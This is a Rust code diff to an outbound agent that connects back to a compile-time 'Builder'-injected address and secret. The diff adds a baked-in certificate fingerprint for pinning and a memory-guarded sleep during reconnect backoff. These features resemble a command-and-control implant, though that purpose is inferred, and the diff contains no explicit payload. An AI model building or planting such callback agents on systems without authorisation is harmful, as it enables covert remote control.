@@ -26,6 +26,8 @@ use uuid::Uuid;
 // Compile-time constants injected by the Builder (may be absent in manual builds).
 const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
 const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
+const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");
+
 
 const MAX_BACKOFF_SECS: u64 = 64;
 
@@ -59,7 +61,8 @@ async fn connect_once(addr: &str, secret: &str, agent_id: &str) -> Result<()> {
     // remaining compatible with certificates issued by enterprise PKIs.
     let tls_config: rustls::ClientConfig = {
         let cfg = crate::config::load_config()?;
-        if let Some(fp) = cfg.server_cert_fingerprint {
+        let fingerprint = cfg.server_cert_fingerprint.or_else(|| BAKED_CERT_FP.map(|s| s.to_string()));
+        if let Some(fp) = fingerprint {
             info!("outbound-c: using certificate pinning (fingerprint configured)");
             let verifier = common::tls_transport::PinnedCertVerifier::from_hex(&fp)
                 .map_err(|e| anyhow::anyhow!("invalid server_cert_fingerprint: {e}"))?;
@@ -166,7 +169,11 @@ pub async fn run_forever() -> Result<()> {
             Err(e) => {
                 error!("outbound-c: session ended: {e:#}");
                 warn!("outbound-c: reconnecting in {backoff:?}");
-                sleep(backoff).await;
+                // Protect sensitive memory while waiting to reconnect.
+                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None).await {
+                    error!("[memory-guard] error during reconnect backoff: {ge}");
+                    sleep(backoff).await;
+                }
                 backoff = (backoff * 2).min(Duration::from_secs(MAX_BACKOFF_SECS));
             }
         }
